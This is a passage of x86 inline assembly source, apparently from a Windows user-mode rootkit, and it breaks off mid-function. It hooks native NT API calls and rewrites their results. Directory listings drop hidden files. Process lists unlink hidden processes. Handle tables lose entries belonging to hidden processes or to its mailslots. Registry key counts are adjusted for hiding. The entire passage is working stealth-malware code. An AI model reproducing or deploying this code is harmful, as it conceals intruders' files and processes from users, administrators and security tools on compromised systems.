  push ebp
  mov ebp,esp
  lea eax,[ebx+@HookedFlags+HP_ReadFile]
  mov al,[eax]
  test al,al
  jz @Safety_ReadFile_org
  lea eax,[ebx+@HT_OldReadFile]
  jmp @Safety_ReadFile_callit
 @Safety_ReadFile_org:
  mov eax,[ebx+@ReadFileAddr]
 @Safety_ReadFile_callit:
  push dword ptr [ebp+018h]             //AOverlapped
  push dword ptr [ebp+014h]             //ANumberOfBytesRead
  push dword ptr [ebp+010h]             //ANumberOfBytesToRead
  push dword ptr [ebp+00Ch]             //ABuffer
  push dword ptr [ebp+008h]             //AFile
  call eax
  leave
  ret 014h

 @Safety_NtQuerySystemInformation:
  push ebp
  mov ebp,esp
  lea eax,[ebx+@HookedFlags+HP_NtQuerySystemInformation]
  mov al,[eax]                                         ;
  test al,al
  jz @Safety_NtQuerySystemInformation_org
  lea eax,[ebx+@HT_OldNtQuerySystemInformation]
  jmp @Safety_NtQuerySystemInformation_callit
 @Safety_NtQuerySystemInformation_org:
  mov eax,[ebx+@NtQuerySystemInformationAddr]
 @Safety_NtQuerySystemInformation_callit:
  push dword ptr [ebp+014h]             //OReturnLength
  push dword ptr [ebp+010h]             //ASystemInformationLength
  push dword ptr [ebp+00Ch]             //OSystemInformation
  push dword ptr [ebp+008h]             //ASystemInformationClass
  call eax
  leave
  ret 010h

 @Safety_NtResumeThread:
  push ebp
  mov ebp,esp
  lea eax,[ebx+@HookedFlags+HP_NtResumeThread]
  mov al,[eax]                                         
  test al,al
  jz @Safety_NtResumeThread_org
  lea eax,[ebx+@HT_OldNtResumeThread]
  jmp @Safety_NtResumeThread_callit
 @Safety_NtResumeThread_org:
  mov eax,[ebx+@NtResumeThreadAddr]
 @Safety_NtResumeThread_callit:
  push dword ptr [ebp+00Ch]             //APreviousSuspendCount
  push dword ptr [ebp+008h]             //AThreadHandle
  call eax
  leave
  ret 008h

 @Safety_NtReadVirtualMemory:
  push ebp
  mov ebp,esp
  lea eax,[ebx+@HookedFlags+HP_NtReadVirtualMemory]
  mov al,[eax]
  test al,al
  jz @Safety_NtReadVirtualMemory_org
  lea eax,[ebx+@HT_OldNtReadVirtualMemory]
  jmp @Safety_NtReadVirtualMemory_callit
 @Safety_NtReadVirtualMemory_org:
  mov eax,[ebx+@NtReadVirtualMemoryAddr]
 @Safety_NtReadVirtualMemory_callit:
  push dword ptr [ebp+018h]                     //AReturnLength
  push dword ptr [ebp+014h]                     //ABufferLength
  push dword ptr [ebp+010h]                     //ABuffer
  push dword ptr [ebp+00Ch]                     //ABaseAddress
  push dword ptr [ebp+008h]                     //AProcessHandle
  call eax
  leave
  ret 014h

 @Safety_NtDeviceIoControlFile:
  push ebp
  mov ebp,esp
  lea eax,[ebx+@HookedFlags+HP_NtDeviceIoControlFile]
  mov al,[eax]
  test al,al
  jz @Safety_NtDeviceIoControlFile_org
  lea eax,[ebx+@HT_OldNtDeviceIoControlFile]
  jmp @Safety_NtDeviceIoControlFile_callit
 @Safety_NtDeviceIoControlFile_org:
  mov eax,[ebx+@NtDeviceIoControlFileAddr]
 @Safety_NtDeviceIoControlFile_callit:
  push dword ptr [ebp+02Ch]                     //AOutputBufferLength
  push dword ptr [ebp+028h]                     //AOutputBuffer
  push dword ptr [ebp+024h]                     //AInputBufferLength
  push dword ptr [ebp+020h]                     //AInputBuffer
  push dword ptr [ebp+01Ch]                     //AIoControlCode
  push dword ptr [ebp+018h]                     //AIoStatusBlock
  push dword ptr [ebp+014h]                     //AApcContext
  push dword ptr [ebp+010h]                     //AApcRoutine
  push dword ptr [ebp+00Ch]                     //AEvent
  push dword ptr [ebp+008h]                     //AFileHandle
  call eax
  leave
  ret 028h

 @Safety_NtOpenProcess:
  push ebp
  mov ebp,esp
  lea eax,[ebx+@HookedFlags+HP_NtOpenProcess]
  mov al,[eax]
  test al,al
  jz @Safety_NtOpenProcess_org
  lea eax,[ebx+@HT_OldNtOpenProcess]
  jmp @Safety_NtOpenProcess_callit
 @Safety_NtOpenProcess_org:
  mov eax,[ebx+@NtOpenProcessAddr]
 @Safety_NtOpenProcess_callit:
  push dword ptr [ebp+014h]                     //AClientId
  push dword ptr [ebp+010h]                     //AObjectAttributes
  push dword ptr [ebp+00Ch]                     //ADesiredAccess
  push dword ptr [ebp+008h]                     //AProcessHandle
  call eax
  leave
  ret 010h

 @Safety_NtCreateFile:
  push ebp
  mov ebp,esp
  lea eax,[ebx+@HookedFlags+HP_NtCreateFile]
  mov al,[eax]
  test al,al
  jz @Safety_NtCreateFile_org
  lea eax,[ebx+@HT_OldNtCreateFile]
  jmp @Safety_NtCreateFile_callit
 @Safety_NtCreateFile_org:
  mov eax,[ebx+@NtCreateFileAddr]
 @Safety_NtCreateFile_callit:
  push dword ptr [ebp+030h]                     //AEaLength
  push dword ptr [ebp+02Ch]                     //AEaBuffer
  push dword ptr [ebp+028h]                     //ACreateOptions
  push dword ptr [ebp+024h]                     //ACreateDisposition
  push dword ptr [ebp+020h]                     //AShareAccess
  push dword ptr [ebp+01Ch]                     //AFileAttributes
  push dword ptr [ebp+018h]                     //AllocationSize
  push dword ptr [ebp+014h]                     //AIoStatusBlock
  push dword ptr [ebp+010h]                     //AObjectAttributes
  push dword ptr [ebp+00Ch]                     //ADesiredAccess
  push dword ptr [ebp+008h]                     //AFileHandle
  call eax
  leave
  ret 02Ch

 @Safety_NtNotifyChangeDirectoryFile:
  push ebp
  mov ebp,esp
  lea eax,[ebx+@HookedFlags+HP_NtNotifyChangeDirectoryFile]
  mov al,[eax]
  test al,al
  jz @Safety_NtNotifyChangeDirectoryFile_org
  lea eax,[ebx+@HT_OldNtNotifyChangeDirectoryFile]
  jmp @Safety_NtNotifyChangeDirectoryFile_callit
 @Safety_NtNotifyChangeDirectoryFile_org:
  mov eax,[ebx+@NtNotifyChangeDirectoryFileAddr]
 @Safety_NtNotifyChangeDirectoryFile_callit:
  push dword ptr [ebp+028h]                     //AWatchSubtree
  push dword ptr [ebp+024h]                     //ANotifyFileter
  push dword ptr [ebp+020h]                     //ABufferLength
  push dword ptr [ebp+01Ch]                     //ABuffer
  push dword ptr [ebp+018h]                     //AIoStatusBlock
  push dword ptr [ebp+014h]                     //AApcContext
  push dword ptr [ebp+010h]                     //AApcRoutine
  push dword ptr [ebp+00Ch]                     //AEvent
  push dword ptr [ebp+008h]                     //AFileHandle
  call eax
  leave
  ret 024h

 @Registry_HowManyEntriesBefore:
  push ebp
  mov ebp,esp
  sub esp,00248h
  {
   -00248       -       LObjectAttributes.Length:ULONG
   -00244       -       LObjectAttributes.RootDirectory:HANDLE
   -00240       -       LObjectAttributes.ObjectName:PUNICODE_STRING
   -0023C       -       LObjectAttributes.Attributes:ULONG
   -00238       -       LObjectAttributes.SecurityDescriptor:PVOID
   -00234       -       LObjectAttributes.SecurityQualityOfService:PVOID
   -00230..024  -       LBuffer1:array of Char
   -020         -       LStringW.Length:USHORT
   -01E         -       LStringW.MaximumLength:USHORT
   -01C         -       LStringW.Buffer:PWSTR
   -018         -       LStringAW.Length:USHORT
   -016         -       LStringAW.MaximumLength:USHORT
   -014         -       LStringAW.Buffer:PCHAR|PWSTR
   -010         -       LHKey:HKEY
   -008         -       RESERVED
   -004         -       LResult:Cardinal
   +008         -       AName:Pointer
   +00C         -       ATable:Pointer
   +010         -       AKey:HKEY
  }

  mov eax,[ebp+010h]
  push 018h
  pop dword ptr [ebp-00248h]
  mov [ebp-00244h],eax
  xor eax,eax
  mov [ebp-004h],eax
  mov [ebp-00234h],eax
  mov [ebp-00238h],eax
  mov [ebp-0023Ch],eax
  lea eax,[ebp-020h]
  mov [ebp-00240h],eax

  mov esi,[ebp+008h]
  mov edi,[ebp+00Ch]
  lea eax,[ebp-00230h]
  mov [ebp-01Ch],eax

 @Registry_HowManyEntriesBefore_cmp_str:
  xor eax,eax
  cmp [edi],al
  jz @Registry_HowManyEntriesBefore_end
  call @pchar_len
  mov [ebp-018h],ax
  mov [ebp-016h],ax
  mov [ebp-014h],edi
  mov eax,00100h
  mov [ebp-020h],ax
  mov [ebp-01Eh],ax

  push 000h                             //AllocateDestinationString
  lea eax,[ebp-018h]
  push eax                              //SourceString
  lea eax,[ebp-020h]
  push eax                              //DestinationString
  call [ebx+@RtlAnsiStringToUnicodeStringAddr]

  dec word ptr [ebp-020h]
  dec word ptr [ebp-020h]
  push edi
  mov edi,[ebp+008h]
  mov [ebp-014h],edi
  call @wchar_len
  pop edi
  dec eax
  dec eax
  mov [ebp-018h],ax
  mov [ebp-016h],ax

  push -001h                            //CaseInSensitive
  lea eax,[ebp-020h]
  push eax                              //String2
  lea eax,[ebp-018h]
  push eax                              //String1
  call [ebx+@RtlCompareUnicodeStringAddr]
  test eax,eax
  jle @Registry_HowManyEntriesBefore_cmp_end

  lea eax,[ebp-00248h]
  push eax                              //ObjectAttributes
  push KEY_ENUMERATE_SUB_KEYS           //DesiredAccess
  lea eax,[ebp-010h]
  push eax                              //KeyHandle
  call [ebx+@NtOpenKeyAddr]
  test eax,eax
  jnz @Registry_HowManyEntriesBefore_loop_next
  push dword ptr [ebp-010h]             //Handle
  call [ebx+@NtCloseAddr]

  inc dword ptr [ebp-004h]
 @Registry_HowManyEntriesBefore_loop_next:
  call @pchar_len
  add edi,eax
  jmp @Registry_HowManyEntriesBefore_cmp_str
 @Registry_HowManyEntriesBefore_cmp_end:
  jnz @Registry_HowManyEntriesBefore_end
  inc dword ptr [ebp-004h]
 @Registry_HowManyEntriesBefore_end:
  mov eax,[ebp-004h]
  leave
  ret 00Ch


 @ProcessDirectoryFileBuffer:
  push ebp
  mov ebp,esp
  sub esp,0021Ch

  {
   -21C..-01C   -       LBuf:array[0..MAX_PATH*2-1] of Char
   -018         -       LFileMappingAddr:Pointer
   -014         -       LBytes:Cardinal
   -010         -       LFileNamePos:Cardinal
   -00C         -       LPrevRecPtr:Pointer
   -008         -       LRecPtr:Pointer
   -004         -       LResult:Cardinal
   +008         -       ABuffer:Pointer           +01C
   +00C         -       ABufLen:Cardinal          +020
   +010         -       AInfoClass:Cardinal       +024
   +014         -       ARetSingle:Boolean        +028
  }

  xor eax,eax
  mov [ebp-004h],eax
  mov [ebp-00Ch],eax            //starting with no prev ptr

  call @OpenFileMapping
  test eax,eax
  jz @ProcessDirectoryFileBuffer_end
  mov [ebp-018h],eax


  mov esi,[ebp+008h]
  mov [ebp-008h],esi

  push 05Eh
  push 03Ch
  pop edx
  pop ecx

  mov eax,[ebp+010h]
  dec eax
  jz @ProcessDirectoryFileBuffer_FileDirectoryInformation
  dec eax
  jz @ProcessDirectoryFileBuffer_FileFullDirectoryInformation
  dec eax
  jz @ProcessDirectoryFileBuffer_FileBothDirectoryInformation
  sub eax,009h
  jnz @ProcessDirectoryFileBuffer_CloseMapping
  sub ecx,038h
  sub edx,034h
 @ProcessDirectoryFileBuffer_FileDirectoryInformation:
  sub ecx,004h
 @ProcessDirectoryFileBuffer_FileFullDirectoryInformation:
  sub ecx,016h
 @ProcessDirectoryFileBuffer_FileBothDirectoryInformation:
  mov [ebp-014h],edx                            //NameLen
  mov [ebp-010h],ecx                            //NamePos

 @ProcessDirectoryFileBuffer_process_record:
  mov esi,[ebp-008h]
  mov ecx,[ebp-014h]
  mov ecx,[ecx+esi]
  add esi,[ebp-010h]

 @ProcessDirectoryFileBuffer_compare:
  lea edi,[ebp-00218h]
  push edi
  rep movsb
  xor eax,eax
  stosw
  pop esi
  mov edi,[ebp-018h]                      //LFileMappingAddr
  add edi,004h                            //+4 = HiddenArray

 @ProcessDirectoryFileBuffer_compare_filecmp:
  movzx eax,byte ptr [edi]
  test eax,eax
  jz @ProcessDirectoryFileBuffer_compare_filecmp_end
  call @cmp_wide_pchar_caseinsens_with_wildcard
  test eax,eax
  jnz @ProcessDirectoryFileBuffer_compare_filecmp_end
  call @pchar_len
  add edi,eax
  jmp @ProcessDirectoryFileBuffer_compare_filecmp
 @ProcessDirectoryFileBuffer_compare_filecmp_end:
  mov esi,[ebp-008h]
  test eax,eax
  jnz @ProcessDirectoryFileBuffer_filecmp_found
  mov eax,[esi]
  test eax,eax                                     //if NextEntryOffset=0=last record
  jz @ProcessDirectoryFileBuffer_CloseMapping
  mov [ebp-00Ch],esi                               //set new PrevRecPtr
 @ProcessDirectoryFileBuffer_process_go_on_next:
  add [ebp-008h],eax                               //add NextEntryOffset to RecPtr
  jmp @ProcessDirectoryFileBuffer_process_record
 @ProcessDirectoryFileBuffer_filecmp_found:
  mov eax,[ebp+014h]
  test al,al
  jnz @ProcessDirectoryFileBuffer_filecmp_new_not_found
  mov edx,[ebp-00Ch]
  test edx,edx
  jz @ProcessDirectoryFileBuffer_filecmp_first_must_die
  mov eax,[esi]                                    //PrevRecPtr.NextEntryOffset
  test eax,eax
  jz @ProcessDirectoryFileBuffer_filecmp_found_change_offset
  add eax,[edx]                                    //+ RecPtr.NextEntryOffset
  jmp @ProcessDirectoryFileBuffer_filecmp_found_change_offset
 @ProcessDirectoryFileBuffer_filecmp_found_change_offset:
  mov [edx],eax                                    //= PrevRecPtr.NextEntryOffset
                                                   //=> one hidden record
//  THISONESUX
  mov ecx,[esi+008h]                               //undocumented item
  mov [edx+008h],ecx                               //should be moved
  mov [ebp-008h],edx                               //RecPtr = PrevRecPtr
  jmp @ProcessDirectoryFileBuffer_process_go_on_next //leave PrevRecPtr and go on next record

 @ProcessDirectoryFileBuffer_filecmp_first_must_die:
  //here we have to move second record on first record's place and count new NextEntryOffset
  mov eax,[esi]                                    //Record[0].NextentryOffset
  test eax,eax
  jz @ProcessDirectoryFileBuffer_filecmp_new_not_found
  mov edx,eax
  lea edi,[esi+eax]                                //Record[1]
  mov ecx,[edi]                                    //Record[1].NextEntryOffset
  test ecx,ecx
  jz @ProcessDirectoryFileBuffer_filecmp_first_must_die_last
  add edx,ecx
  jmp @ProcessDirectoryFileBuffer_filecmp_first_must_die_move
 @ProcessDirectoryFileBuffer_filecmp_first_must_die_last:
  mov ecx,[ebp+00Ch]                               //don't know length of the record
  xor edx,edx                                      //new offset = 0 = last record
 @ProcessDirectoryFileBuffer_filecmp_first_must_die_move:
  xchg esi,edi                                     //from Record[1] to Record[0]
  push edi
  rep movsb                                        //Record[1].NextEntryOffset-times
  pop edi
  mov [edi],edx                                    //Record[0].NextEntryOffset = NewNextEntryOffset
  jmp @ProcessDirectoryFileBuffer_process_record

 @ProcessDirectoryFileBuffer_filecmp_new_not_found:
  xor eax,eax
  mov ecx,[ebp+00Ch]
  mov edi,[ebp+008h]
  rep stosb

  mov [ebp-004h],0C000000Fh                        //STATUS_NO_SUCH_FILE
 @ProcessDirectoryFileBuffer_CloseMapping:
  push dword ptr [ebp-018h]
  call @CloseFileMapping
 @ProcessDirectoryFileBuffer_end:
  mov eax,[ebp-004h]
  leave
  ret 010h


 @ProcessSystemProcessesAndThreadsInformationBuffer:
  push ebp
  mov ebp,esp
  sub esp,014h
  {
   -014         -       LFileMappingAddr:Pointer
   -010         -       LPredBuffer:Pointer
   -00C         -       LBuffer:Pointer
   -008         -       LTotalSize:Cardinal
   -004         -       LResult:Cardinal
   +008         -       ABuffer:Pointer
   +00C         -       AProcessType:Cardinal

    ProcessType - 0 = ptHideFiles
                - 1 = ptRootProcess

  }
  push esi
  push edi
  push 000h
  pop dword ptr [ebp-004h]              //LResult

  call @OpenFileMapping
  test eax,eax
  jz @ProcessSystemProcessesAndThreadsInformationBuffer_end
  mov [ebp-014h],eax

  mov esi,[ebp+008h]
  xor eax,eax
  mov [ebp-008h],eax                    //LTotalSize
  mov [ebp-00Ch],esi                    //LBuffer
  mov [ebp-010h],eax                    //LPredBuffer

 @ProcessSystemProcessesAndThreadsInformationBuffer_proc:
  mov edi,[ebp-00Ch]
  add edi,dword ptr [ebp-008h]

  mov eax,[edi+03Ch]
  test eax,eax
  jz @ProcessSystemProcessesAndThreadsInformationBuffer_next_proc
  push edi
  push esi
  mov esi,eax
  xor eax,eax

  mov edi,[ebp-014h]                    //LFileMappingAddr
  cmp dword ptr [ebp+00Ch],001h         //AProcessType = ptRootProcess
  jnz @ProcessSystemProcessesAndThreadsInformationBuffer_goto_buf
  add edi,[edi]                         //edi -> RootArraySize
 @ProcessSystemProcessesAndThreadsInformationBuffer_goto_buf:
  add edi,004h                          //+4 = HiddenArray ^ RootArray

 @ProcessSystemProcessesAndThreadsInformationBuffer_filecmp:
  movzx eax,byte ptr [edi]
  test eax,eax
  jz @ProcessSystemProcessesAndThreadsInformationBuffer_filecmp_end
  call @cmp_wide_pchar_caseinsens_with_wildcard
  test eax,eax
  jnz @ProcessSystemProcessesAndThreadsInformationBuffer_filecmp_found
  call @pchar_len
  add edi,eax
  jmp @ProcessSystemProcessesAndThreadsInformationBuffer_filecmp

 @ProcessSystemProcessesAndThreadsInformationBuffer_filecmp_found:
  pop esi
  pop edi
  push edi
  push esi

  mov eax,[ebp-010h]
  test eax,eax
  jz @ProcessSystemProcessesAndThreadsInformationBuffer_filecmp_end
  pop esi
  pop edi
  mov edx,[edi]
  test edx,edx
  jnz @ProcessSystemProcessesAndThreadsInformationBuffer_filecmp_not_null
  xor ecx,ecx
  jmp @ProcessSystemProcessesAndThreadsInformationBuffer_filecmp_write_new
 @ProcessSystemProcessesAndThreadsInformationBuffer_filecmp_not_null:
  add dword ptr [ebp-008h],edx
  mov ecx,[edi]
  add ecx,[eax]
 @ProcessSystemProcessesAndThreadsInformationBuffer_filecmp_write_new:
  mov [eax],ecx
  mov dword ptr [ebp-010h],eax
  jmp @ProcessSystemProcessesAndThreadsInformationBuffer_goto_next_proc
 @ProcessSystemProcessesAndThreadsInformationBuffer_filecmp_end:
  pop esi
  pop edi
 @ProcessSystemProcessesAndThreadsInformationBuffer_next_proc:
  mov eax,[edi]
  add dword ptr [ebp-008h],eax
  mov dword ptr [ebp-010h],edi
 @ProcessSystemProcessesAndThreadsInformationBuffer_goto_next_proc:
  mov eax,[edi]
  test eax,eax
  jnz @ProcessSystemProcessesAndThreadsInformationBuffer_proc

 @ProcessSystemProcessesAndThreadsInformationBuffer_CloseMapping:
  push dword ptr [ebp-014h]
  call @CloseFileMapping
 @ProcessSystemProcessesAndThreadsInformationBuffer_end:
  mov eax,[ebp-004h]
  pop edi
  pop esi
  leave
  ret 008h

 @ProcessHandleInformationBuffer:
  push ebp
  mov ebp,esp
  sub esp,00500h
  {
   -00500h      -       LDOBNameString.Status:DWORD
   -004FCh      -       LDOBNameString.Name.Length:Word      | LONI.Name.Length:Word
   -004FAh      -       LDOBNameString.Name.MaxLength:Word   | LONI.Name.MaxLength:Word
   -004F8h..?   -       LDOBNameString.Name.Buffer:PChar     | LONI.Name.Buffer:PWChar
   -068         -       LWrittenHandlesCounter:Cardinal
   -064         -       LTBI.ExitStatus:Cardinal             | LPBI.ExitStatus:Cardinal
   -060         -       LTBI.TebBaseAddress:Pointer          | LPBI.PebBaseAddress:Pointer
   -05C         -       LTBI.ClientId.UniqueProcess:Cardinal | LPBI.AffinityMask:Cardinal
   -058         -       LTBI.ClientId.UniqueThread:Cardinal  | LPBI.Priority:Cardinal
   -054         -       LTBI.AffinityMask:Cardinal           | LPBI.UniqueProcessId:Cardinal
   -050         -       LTBI.Priority:Cardinal               | LPBI.InheritedFromUniqueProcessId:Cardinal
   -04C         -       LTBI.BasePriority:Cardinal
   -048         -       LDupHandle:THandle
   -044..-030   -       LObjectAttr:TObjectAttributes
   -02C..-028   -       LIoStatusBlock:IO_STATUS_BLOCK
   -024         -       LLastPIDHidden:Boolean
   -020         -       LHookedBuffer:Pointer
   -01C         -       LLastPID:Cardinal
   -018         -       LCounter:Cardinal
   -014         -       LDIBNameString.PID:Cardinal
   -010         -       LDIBNameString.Handle:THandle
   -00C         -       LClientId.UniqueProcess:Cardinal
   -008         -       LClientId.UniqueThread:Cardinal
   -004         -       LProcessHandle:THandle
   +008         -       ABuffer:Pointer
   +00C         -       AReturnLength:Cardinal
   +010         -       AFileHandleType:Cardinal
   +014         -       AThreadHandleType:Cardinal
   +018         -       AProcessHandleType:Cardinal
   +01C         -       ADriverHandle:THandle
   +020         -       AThreadHandle:THandle
   +024         -       AProcessHandle:THandle
  }
  push esi
  push edi

  xor eax,eax
  mov [ebp-024h],eax                            //LLastPIDHidden = False
  mov [ebp-018h],eax                            //LCounter = 0
  mov [ebp-068h],eax                            //LWrittenHandlesCounter = 0
  mov esi,[ebp+008h]                            //esi >> ABuffer
  add esi,004h                                  //esi >> ABuffer.HandlesInfo
  mov [ebp-020h],esi                            //LHookedBuffer = ABuffer.HandlesInfo

  push 018h
  pop dword ptr [ebp-044h]                      //LObjectAttr.Length = 018h
  mov [ebp-040h],eax                            //LObjectAttr.RootDirectory
  mov [ebp-03Ch],eax                            //LObjectAttr.ObjectName
  mov [ebp-038h],eax                            //LObjectAttr.Attributes
  mov [ebp-034h],eax                            //LObjectAttr.SecurityDescriptor
  mov [ebp-030h],eax                            //LObjectAttr.SecurityQualityOfService

  dec eax
  mov [ebp-01Ch],eax                            //LLastPID = -1

 @ProcessHandleInformationBuffer_main_loop:
  mov eax,[ebp-018h]                            //LCounter
  mov ecx,[ebp+008h]                            //ABuffer.HandlesCount
  cmp eax,[ecx]                                 //LCounter = ABuffer.HandlesCount
  jz @ProcessHandleInformationBuffer_main_loop_done
  mov eax,[esi]                                 //ABuffer.HandlesInfo[LCounter].ProcessId
  cmp eax,[ebp-01Ch]                            //LLastPID = current pid ?
  jne @ProcessHandleInformationBuffer_main_loop_check_hidden_process
  cmp [ebp-024h],001h                           //LLastPIDHidden ?
  je @ProcessHandleInformationBuffer_main_loop_next
  jmp @ProcessHandleInformationBuffer_main_loop_check_handle
 @ProcessHandleInformationBuffer_main_loop_check_hidden_process:
  mov [ebp-01Ch],eax                            //LLastPID = current pid
  push 000h                                     //ctHiddenProcess
  push eax                                      //LLastPID
  call @CheckProcess
  mov [ebp-024h],eax                            //LLastPIDHidden = hidden process
  test eax,eax                                  //hidden -> next
  jnz @ProcessHandleInformationBuffer_main_loop_next
 @ProcessHandleInformationBuffer_main_loop_check_handle:
  //now have to process types:
  // File               -       name -> mailslots
  // Process            -       PID -> open process
  // Thread             -       CID -> PID -> open thread

  mov ecx,[ebp-01Ch]                            //LLastPID = current pid
  call @GetCurrentProcessId
  cmp eax,ecx
  jnz @ProcessHandleInformationBuffer_main_loop_check_handle_type

  movzx eax,word ptr [esi+006h]                 //ABuffer.HandlesInfo[LCounter].Handle
  cmp eax,[ebp+01Ch]                            //ADriverHandle
  je @ProcessHandleInformationBuffer_main_loop_next
  cmp eax,[ebp+020h]                            //AThreadHandle
  je @ProcessHandleInformationBuffer_main_loop_next
  cmp eax,[ebp+024h]                            //AProcessHandle
  je @ProcessHandleInformationBuffer_main_loop_next
 @ProcessHandleInformationBuffer_main_loop_check_handle_type:
  movzx edi,byte ptr [esi+004h]                 //ABuffer.HandlesInfo[LCounter].Type

  cmp edi,[ebp+018h]                            //type = Process
  je @ProcessHandleInformationBuffer_main_loop_handle_type_thread_or_process
  cmp edi,[ebp+014h]                            //type = Thread
  je @ProcessHandleInformationBuffer_main_loop_handle_type_thread_or_process
  cmp edi,[ebp+010h]                            //type = File
  jnz @ProcessHandleInformationBuffer_main_loop_write_handle
 @ProcessHandleInformationBuffer_main_loop_handle_type_file:
  //type = File
  // => we have to get the name and compare with our mailslots
  // we can use our driver for all other process handles

  mov ecx,[ebp-01Ch]                            //LLastPID = current pid
  call @GetCurrentProcessId
  cmp eax,ecx
  je @ProcessHandleInformationBuffer_main_loop_name_local_file_handle

  mov [ebp-014h],ecx                            //>>LDIBNameString.PID
  movzx eax,word ptr [esi+006h]                 //ABuffer.HandlesInfo[LCounter].Handle
  mov [ebp-010h],eax                            //>>LDIBNameString.Handle

  push 00400h                                   //OutputBufferLength
  lea edi,[ebp-00500h]
  push edi                                      //OutputBuffer = LDOBNameString
  push 008h                                     //InputBufferLength
  lea eax,[ebp-014h]
  push eax                                      //InputBuffer = LDIBNameString
  push 000222000h                               //IoControlCode = IOCTL_GET_NAME_STRING
  lea eax,[ebp-02Ch]
  push eax                                      //IoStatusBlock
  push 000h                                     //ApcContext
  push 000h                                     //ApcRoutine
  push 000h                                     //Event
  push dword ptr [ebp+01Ch]                     //FileHandle = ADriverHandle
  call @Safety_NtDeviceIoControlFile
//  call @HT_OldNtDeviceIoControlFile
  test eax,eax
  jnz @ProcessHandleInformationBuffer_main_loop_write_handle

  cmp dword ptr [edi],000h                      //LDOBNameString.Status = failed?
  je @ProcessHandleInformationBuffer_main_loop_write_handle

  xor eax,eax
  movzx ecx,word ptr [edi+004h]                 //ecx = LDOBNameString.Name.Length
  add edi,00Ch                                  //edi -> name in AnsiString
  mov [edi+ecx],al                              //add null on the end of pchar

  push esi
  lea esi,[ebx+@cMailslotsHiddenName]
  xchg esi,edi
  call @cmp2pchars_caseinsens_with_wildcard
  pop esi
  test eax,eax
  jz @ProcessHandleInformationBuffer_main_loop_write_handle
  jmp @ProcessHandleInformationBuffer_main_loop_next
  
 @ProcessHandleInformationBuffer_main_loop_name_local_file_handle:
  push 000h                                     //ReturnLength
  push 00400h                                   //ObjectInformationLength
  lea edi,[ebp-004FCh]
  push edi                                      //ObjectInformation
  push 001h                                     //ObjectInformationClass = ObjectNameInformation
  movzx eax,word ptr [esi+006h]                 //ABuffer.HandlesInfo[LCounter].Handle
  push eax                                      //ObjectHandle
  call [ebx+@NtQueryObjectAddr]
{  test eax,eax
  jnz @ProcessHandleInformationBuffer_main_loop_write_handle}

  xor eax,eax
  movzx ecx,word ptr [edi]                      //ecx = LDOBNameString.Name.Length
  add edi,008h                                  //edi -> name in AnsiString
  mov [edi+ecx],ax                              //add null on the end of wchar

  push esi
  lea esi,[ebx+@cMailslotsHiddenName]
  xchg esi,edi
  call @cmp_wide_pchar_caseinsens_with_wildcard
  pop esi
  test eax,eax
  jz @ProcessHandleInformationBuffer_main_loop_write_handle
  jmp @ProcessHandleInformationBuffer_main_loop_next

 @ProcessHandleInformationBuffer_main_loop_handle_type_thread_or_process:
  push 000h
  pop dword ptr [ebp-008h]                      //LClientId.UniqueThread
  mov ecx,[esi]                                 //PID
  lea eax,[ebp-00Ch]
  mov [eax],ecx                                 //LClientId.UniqueProcess = PID
  push eax                                      //ClientId
  lea eax,[ebp-044h]
  push eax                                      //ObjectAttributes
  push 040h                                     //DesiredAccess = PROCESS_DUP_HANDLE
  lea eax,[ebp-004h]
  push eax                                      //ProcessHandle
//  call [ebx+@NtOpenProcessAddr]
  call @Safety_NtOpenProcess
  test eax,eax
  jnz @ProcessHandleInformationBuffer_main_loop_write_handle

  xor eax,eax
  xchg edi,eax
  cmp eax,[ebp+018h]                            //type = Process
  je @ProcessHandleInformationBuffer_main_loop_handle_type_process

 @ProcessHandleInformationBuffer_main_loop_handle_type_thread:
  push edi                                      //Options
  push edi                                      //Attributes
  push 040h                                     //DesiredAccess = THREAD_QUERY_INFORMATION
  lea eax,[ebp-048h]
  push eax                                      //TargetHandle
  push -001h                                    //TargetProcessHandle = CurrentProcessHandle
  movzx eax,word ptr [esi+006h]                 //ABuffer.HandlesInfo[LCounter].Handle
  push eax                                      //SourceHandle
  push dword ptr [ebp-004h]                     //SourceProcessHandle
  call [ebx+@NtDuplicateObjectAddr]
  test eax,eax
  jnz @ProcessHandleInformationBuffer_main_loop_close_process_handle

  push edi                                      //ReturnLength
  push 01Ch                                     //ThreadInformationLength
  lea eax,[ebp-064h]
  push eax                                      //ThreadInformation
  push edi                                      //ThreadInformationClass = ThreadBasicInformation
  push dword ptr [ebp-048h]                     //ThreadHandle
  call [ebx+@NtQueryInformationThreadAddr]
  test eax,eax
  jnz @ProcessHandleInformationBuffer_main_loop_close_dup_handle
  push edi                                      //ctHiddenProcess
  push dword ptr [ebp-05Ch]                     //LTBI.ClientId.UniqueProcess
 @ProcessHandleInformationBuffer_main_loop_check_handle_owner:
  call @CheckProcess
  mov edi,eax                                   //if hidden => edi = 1

 @ProcessHandleInformationBuffer_main_loop_close_dup_handle:
  push dword ptr [ebp-048h]                     //Handle
  call [ebx+@NtCloseAddr]
 @ProcessHandleInformationBuffer_main_loop_close_process_handle:
  push dword ptr [ebp-004h]                     //Handle
  call [ebx+@NtCloseAddr]
  test edi,edi                                  //edi = 1 = hidden => not write
  jnz @ProcessHandleInformationBuffer_main_loop_next
  jmp @ProcessHandleInformationBuffer_main_loop_write_handle

 @ProcessHandleInformationBuffer_main_loop_handle_type_process:
  push edi                                      //Options
  push edi                                      //Attributes
  push 00400h                                   //DesiredAccess = PROCESS_QUERY_INFORMATION
  lea eax,[ebp-048h]
  push eax                                      //TargetHandle
  push -001h                                    //TargetProcessHandle = CurrentProcessHandle
  movzx eax,word ptr [esi+006h]                 //ABuffer.HandlesInfo[LCounter].Handle
  push eax                                      //SourceHandle
  push dword ptr [ebp-004h]                     //SourceProcessHandle
  call [ebx+@NtDuplicateObjectAddr]
  test eax,eax
  jnz @ProcessHandleInformationBuffer_main_loop_close_process_handle

  push edi                                      //ReturnLength
  push 018h                                     //ProcessInformationLength
  lea eax,[ebp-064h]
  push eax                                      //ProcessInformation
  push edi                                      //ProcessInformationClass = ProcessBasicInformation
  push dword ptr [ebp-048h]                     //ProcessHandle
  call [ebx+@NtQueryInformationProcessAddr]
  test eax,eax
  jnz @ProcessHandleInformationBuffer_main_loop_close_dup_handle
  push edi                                      //ctHiddenProcess
  push dword ptr [ebp-054h]                     //LPBI.UniqueProcessId
  jmp @ProcessHandleInformationBuffer_main_loop_check_handle_owner

 @ProcessHandleInformationBuffer_main_loop_write_handle:
  mov edi,[ebp-020h]
  push 004h                                     //handle info size = 4 dwords
  pop ecx
  rep movsd
  mov [ebp-020h],edi
  inc dword ptr [ebp-068h]                      //LWrittenHandlesCounter ++
